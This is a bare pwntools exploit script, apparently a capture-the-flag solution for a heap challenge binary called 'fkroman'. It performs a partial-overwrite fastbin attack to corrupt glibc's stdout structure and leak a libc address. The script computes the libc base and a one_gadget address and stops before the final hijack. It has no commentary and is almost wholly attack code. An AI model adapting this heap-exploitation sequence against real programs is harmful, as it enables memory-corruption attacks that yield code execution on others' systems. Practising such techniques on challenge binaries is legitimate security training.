from pwn import *
context.log_level = 'debug'
def add(idx,size):
	p.sendlineafter("choice: ","1")
	p.sendlineafter("Index: ",str(idx))
	sleep(0.1)
	p.sendlineafter("Size: ",str(size))


def free(idx):
	p.sendlineafter("choice: ","3")
	p.sendlineafter("Index: ",str(idx))


def edit(idx,size,data):
	p.sendlineafter("choice: ","4")
	p.sendlineafter("Index: ",str(idx))
	sleep(0.1)
	p.sendlineafter("Size: ",str(size))
	p.sendafter("Content: ",data)



def g(p,data=False):
    gdb.attach(p,data)
    raw_input()

p = process("./fkroman")

add(0,0x100)
add(1,0x10)

free(0)
add(2,0x60)
#g(p)
edit(2,2,"\xdd\x25")
#g(p)
#free(1)
add(3,0x60)
add(4,0x60)
add(5,0x60)
free(3)
free(4)
edit(4,1,"\x00")
add(5,0x60)
add(6,0x60)
add(7,0x60)
edit(7,0x54,"1"*0x33+p64(0xfbad1800)+p64(0x7ffff7dd26a3)*3+"\x50")
p.sendline()
#print p.recv()
#p.recv()
lib=u64(p.recv(6).ljust(8,"\x00"))-3954339
print hex(lib)
one=lib+0xf1147




